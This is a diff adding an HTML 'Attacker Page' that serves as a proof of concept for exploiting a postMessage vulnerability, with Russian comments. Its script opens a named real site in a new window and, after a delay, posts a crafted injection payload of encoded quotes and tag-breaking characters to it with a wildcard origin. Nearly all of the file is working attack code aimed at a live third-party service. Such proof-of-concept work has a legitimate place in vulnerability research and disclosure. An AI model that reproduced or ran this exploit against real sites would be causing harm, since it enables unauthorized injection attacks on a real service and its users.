@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Page</title>
+</head>
+<body>
+    <h1>PoC: Exploiting postMessage Vulnerability</h1>
+    <button onclick="exploit()">Run Exploit</button>
+
+    <script>
+        function exploit() {
+            // Открываем целевую страницу в новом окне
+            var targetWindow = window.open('https://web.koho.ca');
+
+            // Вредоносное сообщение
+            var payload = `{"key":"xrotx1nm93%2527%2522%60'%22/xrotx1nm93/><xrotx1nm93/\>rfk4zqk4p0&"}`;
+
+            // Отправка сообщения через 2 секунды после открытия страницы
+            setTimeout(function() {
+                targetWindow.postMessage(payload, '*');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
